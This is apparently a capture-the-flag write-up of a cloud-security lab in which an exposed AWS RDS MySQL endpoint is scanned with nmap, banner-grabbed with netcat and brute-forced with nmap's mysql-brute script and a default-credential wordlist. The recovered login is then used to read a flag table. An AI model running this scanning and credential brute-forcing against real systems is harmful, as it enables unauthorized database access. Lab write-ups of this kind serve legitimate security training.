# Initial Entry

The scenario here is in the backdrop of rising cybersecurity threats, with chatter on Telegram channels hinting at data dumps and Pastebin snippets exposing snippets of configurations, Huge Logistics is taking no chances. They’ve enlisted your team’s expertise to rigorously assess their cloud infrastructure. Armed with a list of IP addresses and endpoints, a lead emerged — an RDS endpoint: `exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com`. Your mission? Dive deep into this endpoint’s security, and identify any security issues before threat actors do.

  

## Understand what is RDS

Amazon RDS is defined as a Relation database services in more of distributed way.. Kind of service offering from AWS to simply the setup, operational changes and scaling of application and one thing to remember is Amazon RDS supports PostgreSQL, MySQL, Maria DB, Oracle, SQL Server, and Amazon Aurora

  

## Approaching for a solution 

With the following RDS instance URL: [exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com](https://exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com "https://exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com") we will do a simple nmap scan on top 1000 ports and as a result, we can see that port 3306 is open and runs a mysql server 

  

```bash
r4y@DESKTOP-3KBF4H7:/mnt/c/Users/Nithissh$ nmap -sV -Pn --top 1000 -vvv exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com

Look into banner grabbing through netcat, we found that `mysql_native_password`  is supported and what that means is it is authentication mechanism used in mysql when you enter the password it get converted into some kind of kind hash using a method called password native hashing and later when the user enters the password again it is converted into hash format and compared with the stored hash.. If it is validated and verified, user will get loggedin 

  

```bash
r4y@DESKTOP-3KBF4H7:/mnt/c/Users/Nithissh$ nc exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com 3306
J
8.0.32��
       QD]R<�����bAd;F1B*mysql_native_password2
```

  

We can also do the username and password manually but it is time consuming and so, we are automating it using nmap’s mysql-brute script for that we need to do a similiar setups like firstly need a wordlist and for that we are utilizing seclists and setup the delimiter between of the wordlist because it is in the format of `root:root`  where the nmap script supports if it is in a particular format `root/root` 

  

```bash
r4y@DESKTOP-3KBF4H7:/tmp$  wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt -O mysql-creds.txt

With the nmap, we can bruteforce with the `mysql-brute`  script and additonally you can pass the wordlist which we have edited through `brute.credfile` params.. After nmap scan is completed, we found ou valid credentials for the database which is `dbuser:123`⁠

  

```bash
r4y@DESKTOP-3KBF4H7:/tmp$ nmap -Pn -p3306 --script=mysql-brute --script-args brute.delay=10,brute.mode=creds,brute.credfile=mysql-creds.txt exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com

In mysql commandline on to your host machine and with the following we can able to connect to the host [`exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com`](https://exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com "https://exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com") with the username as `dbuser` and our password will be `123`⁠

  

```bash
r4y@DESKTOP-3KBF4H7:/tmp$ mysql -h exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com -u dbuser -p

Let’s check the permissions or grants of `dbuser`  with the following query `SHOW GRANTS FROM “dbuser”;`  where it will show what it has access to and we have access `user_info` database and in the you can enumerate users table or flag as well

  

```bash
mysql> SHOW GRANTS FOR "dbuser"
    -> ;
+-----------------------------------------------------+
| Grants for dbuser@%                                 |
+-----------------------------------------------------+
| GRANT USAGE ON *.* TO `dbuser`@`%`                  |
| GRANT SELECT ON `user_info`.`flag` TO `dbuser`@`%`  |
| GRANT SELECT ON `user_info`.`users` TO `dbuser`@`%` |
+-----------------------------------------------------+
3 rows in set (0.18 sec)
```

  

Let’s change the database by entering query which is `use user_info;`  and once the database is changed, try disclosing the table susing `show tables`⁠

  

```bash
mysql> use user_info;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_user_info |
+---------------------+
| flag                |
| users               |
+---------------------+
2 rows in set (0.18 sec)
```

  

We got our flag with the following query `SELECT * FROM flag` 

```bash
mysql> select * from flag
    -> ;
+----------------------------------+
| flag                             |
+----------------------------------+
| e1c342d58b6933b3e0b5078174fd5a62 |
